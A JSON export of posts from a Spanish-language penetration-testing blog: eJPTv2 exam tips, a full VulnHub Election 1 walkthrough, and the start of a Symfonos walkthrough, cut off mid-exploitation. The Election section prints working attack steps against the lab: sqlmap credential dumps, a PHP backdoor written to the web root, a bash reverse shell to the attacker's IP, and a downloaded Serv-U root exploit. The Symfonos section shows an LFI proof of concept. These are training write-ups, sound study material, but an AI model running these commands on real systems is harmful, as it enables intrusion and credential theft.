[
  
  {
    "title": "Mi experencia con la eJPTv2 y consejos para aprobarla",
    "url": "/posts/Experiencia_ejpt/",
    "categories": "Hacking",
    "tags": "",
    "date": "2023-08-19 00:00:00 -0400",
    





    
    "snippet": "¡Hola! En esta oportunidad les contaré mi experiencia con la certificación eJPT, con el objetivo de que sirva de ayuda para todos aquellos que quieran rendir la certificación y estén un poco perdid...",
    "content": "¡Hola! En esta oportunidad les contaré mi experiencia con la certificación eJPT, con el objetivo de que sirva de ayuda para todos aquellos que quieran rendir la certificación y estén un poco perdidos.Mi experienciaPara resumir, mi experiencia fue buena y consecuente con los temas del curso oficial, aunque tuve algunos problemas técnicos.Hablemos antes un poco respecto al examen:Como se nos informa al momento de rendirlo, es Browsed Based y todo lo que necesitas está integrado en el laboratorio del examen. Por ello, no puedes subir scripts ni nada por el estilo, por ejemplo, no podrás subir el LinPEAS ni tampoco podrás hacer pivoting con chisel, así que es algo que debes tener en cuenta.Nos enfrentaremos a una DMZ, así que aprender pivoting es necesario. Si leemos la Letter Of Engagement, tenemos un ejemplo:Por lo tanto, tener claro los conceptos de redes es clave.El examen consta de diferentes preguntas relacionadas a la máquina, algunas son de selección múltiple y otras son flags, en caso de que tengas problemas en el laboratorio puedes reiniciarlo, pero debes leer el Lab Guidelines donde se te explica todo.¿Es tan fácil como todos dicen?No es cualquier cosa, si no tienes la práctica y los conocimientos necesarios vas a reprobar seguro, pero las máquinas en sí son fáciles. Cabe destacar que encontrarás tanto máquinas Linux como Windows.¿La explotación y escalada es muy difícil?El mayor desafío de esta certificación es enumerar más que explotar y escalar, así que no.En los documentos nos mencionan que no es un CTF, así que no nos encontraremos los típicos desafíos de CTF o cosas demasiado rebuscadas. Con respecto a la explotación, poco que decir al respecto, tienen el nivel de una máquina fácil. Recomiendo manejar metasploit perfectamente, está bien querer hacer las cosas a mano, yo también lo hago, pero en caso de que algo no funcione como esperan él será su amigo, pues este examen está hecho para que se utilice metasploit.Personalmente, las escaladas estuvieron sencillas, te encontrarás con las típicas de siempre, pero debes saber buscar.Problemas técnicosDesgraciadamente, tuve varios problemas a lo largo del examen, a pesar de que lo terminé relativamente rápido (unas 6 horas creo).Vamos a partir diciendo que soy de Latinoamérica (Chile), mi internet sinceramente es bueno, sin embargo, el laboratorio se me desconectó unas 5 o 6 veces diría yo, lo cual era simplemente molesto porque el progreso no se pierde ni nada por el estilo (también existía un delay horrible). El problema grave fue en el pivoting, pues hice el procedimiento del pivoting correctamente pero los escaneos demoraban demasiado tiempo, era ridículo, aproximadamente se demoraba de 3 a 5 min en escanear un solo puerto para saber si estaba abierto o no. Luego de estar bastante tiempo encontré una web, la cual demoraba aproximadamente 10 minutos en cargar y a veces daba time out, por lo que me fue imposible reconocer las tecnologías por detrás y tuve 2 o 3 preguntas erradas por ello. Fue lamentable, pero entregué el examen porque sabía que ya había aprobado aunque fallara en el pivoting.Espero que esto no les ocurra.¿Otras dificultades?Tuve algunos problemas a la hora de ganar acceso, así que tuve utilizar diferentes métodos, desde el típico payload de msfvenom, pasando por el oneline de bash, hasta el shell_exec del típico archivo php. Por lo tanto, recomiendo manejar diferentes formas de ganar acceso a una máquina y no desesperarse porque algo no funciona a la primera.También, ligado a lo anterior de que no son cosas tan rebuscadas, entré en un “rabbit hole” y lo que estaba haciendo estaba bien difícil, así que recomiendo siempre pensar bien antes de intentar explotar algo.En síntesis, la certificación me gustó bastante, la dificultad es como todos dicen pero no hay que relajarse, siempre hay que ir preparado para lo que sea. A pesar de los problemas técnicos recomiendo bastante esta certificación, sobretodo para probarte a tí mismo que puedes hacerlo.¿Donde estudiar?Les haré una pequeña lista de los recursos que utilicé para estudiar, la idea es que investiguen cada una de las siguientes opciones que expondré a continuación y elijan la que más les guste.  El curso oficial del INE (Penetration Testing Student)Buen curso, trata todas las temáticas evaluadas en el examen (obviamente). Lo completé y fue la opción que me ha dejado más conforme. Cabe destacar que el curso es en inglés, pero tiene subtítulos al español en caso de que el inglés no sea precisamente tu fuerte.  Introducción al hacking (Hack4u)Como no hablar del gran curso del tito savitar, si tienes la oportunidad de suscribirte a la academia y hacer el curso lo recomiendo completamente. De hecho, recomendaría hacer este curso primero, más que el curso oficial del INE, porque savitar explica desde 0 (redes) y el curso del INE asume que sabes ciertas cosas y si eres totalmente novato puede que se te dificulte un poco.Siendo sincero, para la certificación es suficiente llegar hasta antes de OWASP el resto queda para otras certificaciones más complicadas.  TryHackme (Jr Penetration Tester)Muy útil, personalmente no llegué a terminarlo pero si he hecho varias máquinas de TryHackMe y me sirvieron bastante. Buena opción para los que no tienen dinero para pagar los cursos, además tiene un sistema de preguntas sobre la máquina similar al examen del eJPT, por lo que sirve para practicar.  Resolución de máquinas en youtube de savitar (S4viOnLive)Esto va de la mano con la opción anterior, decenas y decenas de máquinas resultas en youtube, no hay excusa para no estudiar. La única desventaja de esta opción es que las máquinas de Hack the Box estarán retiradas, por lo que si no tienes una suscripción vip no podrás resolverlas por ti mismo, pero tienes otras plataformas como VulnHub. Adicionalmente, para no estar perdido puedes utilizar el buscador de savitar, filtrar por ejpt y así encontrar máquinas que puedan servirte en tu estudio.Estos son todos los cursos/recursos que utilicé para estudiar y recomiendo.Herramientas necesarias  nmap  metasploit  dirb  wfuzz  crackmapexec  ftp  wpscan  hydra  msfvenom  john  searchsploit  smbmapAquí hay un listado de herramientas que deben manejar al revés y al derecho, y deben saber todo lo que ofrecen. Pero no son las únicas, existen muchas más así que deben investigar.Máquinas recomendadasDejaré un listado de máquinas que les servirán para practicar:  Friendly (HackMyVM)  Root me (TryHackMe)  Lame (HackTheBox) VIP  Blog (TryHackme)  Basic pentesting (TryHackMe)  Vulnet: Internal (TryHackMe)  Pickle Rick (TryHackMe)  Dark Hole 1 (VulnHub)  Symfonos (VulnHub)Todas estas máquinas son gratis, menos Lame.Consejos y recomendaciones  La enumeración es la clave, enumera todo lo que puedas con todas las herramientas que conozcas y tengas disponibles en el examen.  Lee atentamente la Letter of Engagement y Lab Guidelines.  Evita hacer fuerza bruta de primera opción, analiza siempre todos los posibles vectores.  Evita reventar los servicios, recuerda que no es un CTF, te pueden bloquear por mucho tráfico o puedes botar el servicio.  No todo lo que brilla es oro, que no te ciege un método e impida que pienses en otras vías.  Ten tu propia herramienta para tomar notas en tu equipo, debes ir anotando toda la información lo más ordenado posible, el orden es la clave.  No te desesperes porque tu idea no funcionó, sigue buscando.  Evita leer las preguntas al iniciar el examen porque podrían confundirte, leelas una vez estés demasiado perdido.Recursos útiles  Buscador de máquinas de savitar  Simulación de laboratorio  Pivoting con metasploitY bien, esto es todo lo que tenía para decirles, espero que les sirva para estar más seguros a la hora de preparar el examen.¡Exito!"
  },
  
  {
    "title": "Election 1 VulnHub Write-up",
    "url": "/posts/Election/",
    "categories": "Write up, VulnHub",
    "tags": "Enumeration, Information leakage, Fuzzing, SQLi, CMS, sqlmap, phpMyAdmin abuse, SUID, Linux, Medium",
    "date": "2023-06-22 00:00:00 -0400",
    





    
    "snippet": "Resumen¡Hola! En esta oportunidad vamos a resolver la máquina de VulnHub llamada Election, la cual tiene una dificultad media. Para lograr vulnerarla realizaremos lo siguiente:  Reconocimiento del ...",
    "content": "Resumen¡Hola! En esta oportunidad vamos a resolver la máquina de VulnHub llamada Election, la cual tiene una dificultad media. Para lograr vulnerarla realizaremos lo siguiente:  Reconocimiento del sistema.  Fuzzing para encontrar los directorios web.  Credenciales expuestas en binario.  Explotación de SQLi con sqlmap.  Abuso de phpMyAdmin para subir archivo malicioso a la web.  Abuso de archivo SUID para escalar privilegios (Serv -U).Reconocimiento y EnumeraciónEscaneamos nuestro target:sudo nmap -p- -sS --open --min-rate 2000 -n -Pn 172.26.65.86 -oG capturaAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpRealizamos un escaneo de los servicios expuestos utilizando nmap:nmap -sVC -p22,80 172.26.65.86 -oN portsComo resultado del escaneo tenemos:PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 20d1ed84cc68a5a786f0dab8923fd967 (RSA)|   256 7889b3a2751276922af98d27c108a7b9 (ECDSA)|_  256 b8f4d661cf1690c5071899b07c70fdc0 (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelVemos que solo está abierto el puerto 22 y 80, vamos a enumerar informacicón sobre esta página http con whatweb:whatweb http://172.26.65.86http://172.26.65.86 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[172.26.65.86], Title[Apache2 Ubuntu Default Page: It works]Vemos poca cosa, vamos a ver el sitio, al parecer es la típica plantilla de apache cuando recien está instalado:Efectivamente, poco podemos hacer por acá, por lo tanto, vamos a realizar fuzzing para descubrir directorios:gobuster dir -u http://172.26.65.86 -t 100 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txtDescubrimos algunos directorios:/javascript           (Status: 301) [Size: 317] [--&gt; http://172.26.65.86/javascript/]/election             (Status: 301) [Size: 315] [--&gt; http://172.26.65.86/election/]/phpmyadmin           (Status: 301) [Size: 317] [--&gt; http://172.26.65.86/phpmyadmin/]/server-status Nos llama la atención election y phpmyadmin, para phpmyadmin aún no tenemos credenciales así que iremos por election:Vemos lo que es al parecer un CMS, antes de realizar cualquier cosa vamos a buscar alguna vulnerabilidad asociada usando searchsploit: Exploit Title                                                                                                                   |  Path--------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Adobe Flash - Selection.setFocus Use-After-Free                                                                                  | multiple/dos/40307.txtAdobe Flash Selection.SetSelection - Use-After-Free                                                                              | windows_x86-64/dos/39043.txteLection 2.0 - 'id' SQL Injection                                                                                                | php/webapps/48122.txtLinux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86-64) - 'set_selection()' UTF-8 Off-by-One P | linux_x86-64/local/9083.cMicrosoft Internet Explorer 9 - IEFRAME CSelection­Interact­Button­Behavior::_Update­Button­Location Use-After-Free (MS13-0 | windows/dos/40907.htmlMicrosoft Windows Server 2003 - AD BROWSER ELECTION Remote Heap Overflow                                                         | windows/dos/16166.pySunView (SunOS 4.1.1) - 'selection_svc' Remote File Read                                                                         | solaris/remote/19040.txtVemos algo de Election 2.0 donde se tiene un parámetro id vulnerable a SQLi, sin embargo, aun no sabemos en qué contexto es esto, por lo tanto, vamos a seguir enumerando:gobuster dir -u http://172.26.65.86/election -t 100 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txtComo resultado de fuzzear bajo el directorio election tenemos:/data                 (Status: 301) [Size: 320] [--&gt; http://172.26.65.86/election/data/]/admin                (Status: 301) [Size: 321] [--&gt; http://172.26.65.86/election/admin/]/lib                  (Status: 301) [Size: 319] [--&gt; http://172.26.65.86/election/lib/]/media                (Status: 301) [Size: 321] [--&gt; http://172.26.65.86/election/media/]/languages            (Status: 301) [Size: 325] [--&gt; http://172.26.65.86/election/languages/]/js                   (Status: 301) [Size: 318] [--&gt; http://172.26.65.86/election/js/]/themes               (Status: 301) [Size: 322] [--&gt; http://172.26.65.86/election/themes/]Vemos algunos directorios interesantes, vamos a revisar data y admin:No encontramos nada en data, vamos a revisar admin:Vemos que necesitamos algún id, sin embargo, no es el id de la SQLi, vamos a seguir enumerando para saber por donde tenemos que movernos:gobuster dir -u http://172.26.65.86/election/admin -t 100 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x phpSi fuzzeamos por extensiones de archivos, en este caso php, encontramos lo siguiente:/themes               (Status: 301) [Size: 322] [--&gt; http://172.26.65.86/election/themes/]/data                 (Status: 301) [Size: 320] [--&gt; http://172.26.65.86/election/data/]/admin                (Status: 301) [Size: 321] [--&gt; http://172.26.65.86/election/admin/]/lib                  (Status: 301) [Size: 319] [--&gt; http://172.26.65.86/election/lib/]/languages            (Status: 301) [Size: 325] [--&gt; http://172.26.65.86/election/languages/]/js                   (Status: 301) [Size: 318] [--&gt; http://172.26.65.86/election/js/]/.php                 (Status: 403) [Size: 277]/card.php             (Status: 200) [Size: 1935]ExplotaciónEncontramos un directorio llamado card.php, vamos a ver de qué se trata:Bueno, tenemos lo que parecer ser un mensaje en binario, vamos a ver si dice algo importante:Tenemos más binario, si lo transformamos una vez más:Tenemos unas credenciales, podría referirse al panel de admin que vimos anteriormente o quizás a las credenciales por ssh, vamos a probar primero para el panel admin:Vemos que el código 1234 corresponde al administrador llamado Love, vamos a ingresar la password:Hemos entrado, acá debe ser donde se produzca la SQLi, vamos a revisar el script para tener más información:POST /election/admin/ajax/op_kandidat.php HTTP/1.1Host: HOSTNAMEUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://HOSTNAME/election/admin/kandidat.php?_Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 17Connection: closeCookie: el_listing_panitia=5; el_mass_adding=false; el_listing_guru=5; el_listing_siswa=5; PHPSESSID=b4f0c3bbccd80e9d55fbe0269a29f96a; el_lang=en-usaksi=fetch&amp;id=256Nos dicen que al tramitar esta petición, en el parámetro id existe una SQLi, vamos a buscar en qué sección de la página tramitamos dicha petición:Vemos que arriba nos dice algo de kandidat que es un recurso al cual se le envía la petición POST, vamos a intentar editar la información y capturar la petición por brupsuite:Vemos que tiene la misma estructura que la petición que hablaba el txt de la vulnerabilidad, por lo tanto, tiene que ser esta. Podemos hacer la prueba haciendo manual, pero en esta oportunidad vamos a utilizar slqmap para enumerar la información, vamos a exportar la petición de burpsuite y se la pasamos a sqlmap:sqlmap -r SQLi --dbs --batchVamos a enumerar las bases de datos.available databases [4]:                                                                                                                                          [*] election[*] information_schema[*] mysql[*] performance_schemaSi enumeramos election, no encontraremos demasiada información:+----+------+---------+----------+----------------------------------+| id | nama | level   | no_induk | password                         |+----+------+---------+----------+----------------------------------+| 1  | Love | 1       | 1234     | bb113886b0513a9d882e3caa5cd73314 |+----+------+---------+----------+----------------------------------+Encontramos esto, pero deben ser las credenciales para entrar al panel de election.Asi que vamos a buscar información en mysql:sqlmap -r SQLi -D mysql --tables --batch+---------------------------+| user                      || column_stats              || columns_priv              || db                        || event                     || func                      || general_log               || gtid_slave_pos            || help_category             || help_keyword              || help_relation             || help_topic                || host                      || index_stats               || innodb_index_stats        |Encontramos muchas tablas, pero una nos llama la atención que es la user, vamos a ver qué contiene:sudo sqlmap -r SQLi -D mysql -T user --dump --batch------------+----------------------+-----------------------+-----------------------+------------------------+| Host      | User    | plugin                | is_role | Password                                             Execute_priv | Process_priv | Show_db_priv | Trigger_priv | default_role | x509_subject | Shutdown_priv | max_qoutine_priv | max_user_connections | Create_tmp_table_priv | authentication_string | Create_tablespace_priv |+-----------+---------+-----------------------+---------+-------------------------------------------------------------------+--------------+--------------+--------------+--------------+--------------+---------------+------------------+----------------------+-----------------------+-----------------------+------------------------+| localhost | root    | mysql_native_password | N       | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 (toor)     Y            | Y            | Y            | Y            | &lt;blank&gt;      | &lt;blank&gt;      | Y             | 0                | 0                    | Y                     | &lt;blank&gt;               | Y                      || localhost | newuser | &lt;blank&gt;               | N       | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 (password) Y            | Y            | Y            | Y            | &lt;blank&gt;      | &lt;blank&gt;      | Y             | 0                | 0                    | Y                     | &lt;blank&gt;               | Y                      |Vemos que para el usuario root, la contraseña es toor, vamos a probarla en el panel de phpmyadmin:Hemos entrado, ya estamos practicamente, lo que tenemos que pensar ahora es en cómo podemos ganar acceso al sistema, y para ello vamos a crear un nuevo archivo que será nuestro backdoor, sabemos que la web nos permite ejecutar código php, por lo tanto, intentaremos subir un archivo php malicioso a la web utilizando sql.Lo primero que haremos será ingresar a la parte de election en phpmyadmin:Nos situamos en la pestaña de SQL para crear una query, y vamos a usar la función into outfile para guardar nuestro código php, y la ruta donde lo guardaremos será la típica ruta en linux /var/www/html/, así que vamos a probar:Vamos a darle a go.Si todo ha salido bien, deberiamos tenemos entonces un nuevo directorio llamado backdoor.php en la página web, donde seremos capaces de injectar comandos:Vemos que no sale nada, pero no dice que no existe, esto es una buena señal pues debería estar interpretando el código php, vamos entonces a intentar injectar código:Excelente, tenemos RCE ahora solo falta ganar acceso al sistema, prepararemos nuestro listener en el puerto 1234 y en la web pondremos:http://172.26.65.86/backdoor.php?cmd=bash -c 'bash -i &gt;%26 /dev/tcp/172.26.70.49/1234 0&gt;%261'Al mandar la solicitud veremos que llegó una conexión:nc -nvlp 1234listening on [any] 1234 ...connect to [172.26.70.49] from (UNKNOWN) [172.26.65.86] 57552bash: cannot set terminal process group (747): Inappropriate ioctl for devicebash: no job control in this shellwww-data@election:/var/www/html$ whoamiwhoamiwww-dataBien, hemos ganado acceso al sistema, vamos a hacer un tratamiento de la tty y seguimos.Escalada de privilegiosCon nuestra terminal lista, vamos a buscar posibles vectores para escalar privilegios:www-data@election:/var/www/html$ id  uid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@election:/var/www/html$ sudo -l[sudo] password for www-data: Vamos a enumerar binarios SUID que quizás existan:www-data@election:/var/www/html$ find / -perm -4000 2&gt;/dev/null/usr/bin/arping/usr/bin/passwd/usr/bin/pkexec/usr/bin/traceroute6.iputils/usr/bin/newgrp/usr/bin/chsh/usr/bin/chfn/usr/bin/gpasswd/usr/bin/sudo/usr/sbin/pppd/usr/local/Serv-U/Serv-U/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/xorg/Xorg.wrap/bin/fusermountAparecen muchos, sin embargo, hay uno que normalmente nunca está y es el Serv-U, si buscamos esto por searchsploit:Serv-U FTP Server &lt; 15.1.7 - Local Privilege Escalation (1)      | linux/local/47009.cServ-U FTP Server &lt; 15.1.7 - Local Privilege Escalation (2)      | multiple/local/47173.shVemos que existe una forma de escalar privilegios, vamos a intentarlo, nos traemos el .c a nuestro directorio con la flag -m.Procedemos a compartir el archivo mediante un servidor http con python, en la máquina víctima haremos wget para descargarnos dicho archivo:sudo python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...Descargamos el archivo:www-data@election:/tmp$ wget http://172.26.70.49/privesc.c--2023-06-23 03:53:40--  http://172.26.70.49/privesc.cConnecting to 172.26.70.49:80... connected.HTTP request sent, awaiting response... 200 OKLength: 588 [text/x-csrc]Saving to: 'privesc.c'privesc.c                                            100%[=====================================================================================================================&gt;]     588  --.-KB/s    in 0s      2023-06-23 03:53:40 (84.8 MB/s) - 'privesc.c' saved [588/588]Nos descargamos el archivo en el directorio tmp para que no hayan problemas, vamos a compilarlo:www-data@election:/tmp$ gcc privesc.c -o privescwww-data@election:/tmp$ chmod +x privescLe damos permisos de ejecución y lo ejecutamos:www-data@election:/tmp$ ./privesc uid=0(root) gid=0(root) groups=0(root),33(www-data)opening root shell# whoamiroot# cat /root/root.txt5238feefc4ffe09645d97e9e¡Listo! Hemos terminado la intrusión.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Symfonos VulnHub Write-up",
    "url": "/posts/symfonos/",
    "categories": "Write up, VulnHub",
    "tags": "Enumeration, Information leakage, Path hijacking, LFI, Wordpress, SUID, Linux, Easy",
    "date": "2023-06-15 00:00:00 -0400",
    





    
    "snippet": "Resumen¡Hola! En esta oportunidad vamos a resolver la máquina de VulnHub llamada Symfonos, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Reconocimiento del s...",
    "content": "Resumen¡Hola! En esta oportunidad vamos a resolver la máquina de VulnHub llamada Symfonos, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Reconocimiento del sistema.  Enumeración de smb.  Enumeración de wordpress.  Explotación de LFI.  Utilización de mail para RCE.  Abuso de SUID (path hijacking).Reconocimiento y EnumeraciónEscaneamos nuestro targetsudo nmap -p- --open -sS --min-rate 2000 -n -Pn 172.26.75.241 -oG capturaAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT    STATE SERVICE22/tcp  open  ssh25/tcp  open  smtp80/tcp  open  http139/tcp open  netbios-ssn445/tcp open  microsoft-dsMAC Address: 00:0C:29:E5:9A:C9 (VMware)Realizamos un escaneo de los servicios expuestos utilizando nmap:nmap -sVC -p22,25,80,139,445 172.26.75.241 -oN portsComo resultado del escaneo tenemos:PORT    STATE SERVICE     VERSION22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: |   2048 ab5b45a70547a50445ca6f18bd1803c2 (RSA)|   256 a05f400a0a1f68353ef45407619fc64a (ECDSA)|_  256 bc31f540bc08584bfb6617ff8412ac1d (ED25519)25/tcp  open  smtp        Postfix smtpd| ssl-cert: Subject: commonName=symfonos| Subject Alternative Name: DNS:symfonos| Not valid before: 2019-06-29T00:29:42|_Not valid after:  2029-06-26T00:29:42|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8|_ssl-date: TLS randomness does not represent time80/tcp  open  http        Apache httpd 2.4.25 ((Debian))|_http-title: Site doesn't have a title (text/html).|_http-server-header: Apache/2.4.25 (Debian)139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   311: |_    Message signing enabled but not required| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.5.16-Debian)|   Computer name: symfonos|   NetBIOS computer name: SYMFONOS\\x00|   Domain name: \\x00|   FQDN: symfonos|_  System time: 2023-06-15T22:37:55-05:00| smb2-time: |   date: 2023-06-16T03:37:55|_  start_date: N/ABien, observamos varios servicios. En primer lugar, vamos a ver qué encontramos para los puertos 445 y 139, para ello usamos crackmapexec:crackmapexec smb 172.26.75.241SMB         172.26.75.241   445    SYMFONOS         [*] Windows 6.1 (name:SYMFONOS) (domain:) (signing:False) (SMBv1:True)Vamos a enumerar si existen shares en los que tengamos privilegios de lectura, vamos a usar smbmap para ello:smbmap -H 172.26.75.241[+] Guest session       IP: 172.26.75.241:445   Name: symfonos.mshome.net                                       Disk                                                    Permissions     Comment        ----                                                    -----------     -------        print$                                                  NO ACCESS       Printer Drivers        helios                                                  NO ACCESS       Helios personal share        anonymous                                               READ ONLY        IPC$                                                    NO ACCESS       IPC Service (Samba 4.5.16-Debian)Observamos que existe 1 share en el que tenemos permiso, anonymous, además, podemos ver que existe un usuario llamado helios.Nos conectamos con smbclient:smbclient //172.26.75.241/anonymousPassword for [WORKGROUP\\grafis]:Try \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Fri Jun 28 21:14:49 2019  ..                                  D        0  Fri Jun 28 21:12:15 2019  attention.txt                       N      154  Fri Jun 28 21:14:49 2019Vemos que existe un recurso llamado attention.txt vamos a descargarlo utilizando get y vamos a leerlo:cat attention.txt───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────       │ File: attention.txt───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────   1   │    2   │ Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'!    3   │    4   │ Next person I find using one of these passwords will be fired!   5   │    6   │ -ZeusTenemos un mensaje nos dice que los usuarios están utilizando contraseñas débiles como epidioko, qwerty y baseball, como ya sabemos que existe el usuario helios vamos a intentar entrar a su recurso compartido:smbclient //172.26.75.241/helios -U 'helios'Password for [WORKGROUP\\helios]:Try \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Fri Jun 28 20:32:05 2019  ..                                  D        0  Wed Jun  7 21:18:26 2023  research.txt                        A      432  Fri Jun 28 20:32:05 2019  todo.txt                            A       52  Fri Jun 28 20:32:05 2019                19994224 blocks of size 1024. 16354340 blocks availablesmb: \\&gt; Entramos utilizando la contraseña qwerty.Vamos a descargar los 2 archivos que encontramos para leerlos:cat research.txt───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────       │ File: research.txt───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────   1   │ Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day fr       │ om the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famous       │ ly the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────❯ cat todo.txt───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────       │ File: todo.txt───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────   1   │    2   │ 1. Binge watch Dexter   3   │ 2. Dance   4   │ 3. Work on /h3l105Vemos que la primera es una descripción y el segundo parece ser un directorio. Sabemos que también tiene el puerto 80 abierto con un servicio http, asi que vamos a utilizar la herramienta whatweb para enumerar información:whatweb http://172.26.75.241http://172.26.75.241 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[172.26.75.241]No vemos mucho, vamos a inspeccionar la página:Vemos una imagen, antes de realizar fuzzing vamos a ver si realmente /h3l105 es un directorio (hay que agregar symfonos.local al /etc/hosts):Efectivamente, corresponde a un sitio en wordpress. Vamos a enumerar información utilizando wpscan:wpscan --url http://symfonos.local/h3l105 --enumerate t,u,p_______________________________________________________________         __          _______   _____         \\ \\        / /  __ \\ / ____|          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\            \\  /\\  /  | |     ____) | (__| (_| | | | |             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|         WordPress Security Scanner by the WPScan Team                         Version 3.8.22       Sponsored by Automattic - https://automattic.com/       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________Vamos a enumerar usuarios, plugins y temas.Del escaneo podemos sacar la siguiente información relevante:[i] Plugin(s) Identified:[+] mail-masta | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/ | Latest Version: 1.0 (up to date) | Last Updated: 2014-09-19T07:52:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | Version: 1.0 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt[+] site-editor | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/ | Latest Version: 1.1.1 (up to date) | Last Updated: 2017-05-02T23:34:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | Version: 1.1.1 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt  [i] User(s) Identified:[+] admin | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: |  Rss Generator (Passive Detection) |  Wp Json Api (Aggressive Detection) |   - http://symfonos.local/h3l105/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)ExplotaciónVemos que ha identificado algunos plugins y un usuario. Vamos a ver si los plugins utilizados tienen alguna vulnerabilidad:searchsploit mail masta--------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                                                   |  Path--------------------------------------------------------------------------------------------------------------------------------- ---------------------------------WordPress Plugin Mail Masta 1.0 - Local File Inclusion                                                                           | php/webapps/40290.txtWordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)                                                                       | php/webapps/50226.pyWordPress Plugin Mail Masta 1.0 - SQL Injection                                                                                  | php/webapps/41438.txtVemos que existen, vamos a ver los del Local FIle Inclusion, si hacemos searchsploit -x php/webapps/40290.txt nos mostrará el txt, si nos vamos al final tenemos:Typical proof-of-concept would be to load passwd file:http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwdAl parecer count_of_send.php tiene un LFI en el parámetro pl, vamos a ver si esto se acontece:Tenemos el LFI, esto es interesante porque hay un servicio que aún no hemos auditado, el smtp, normalmente los servicios de correo tiene un path específico para el usuario, sabemos que existe usuario helios, vamos a intentar ver si podemos leer sus correos:Podemos ver sus mail, y el contenido se ve en la página de wordpress, esto es muy interesante, porque si somos capaces de enviar un correo a helios con instrucciones php maliciosas, el servidor va a interpretar dicho código, por lo tanto, podríamos acontecer un RCE, vamos a enviar un mail:nc 172.26.75.241 25220 symfonos.localdomain ESMTP Postfix (Debian/GNU)Debemos definir quién envía el 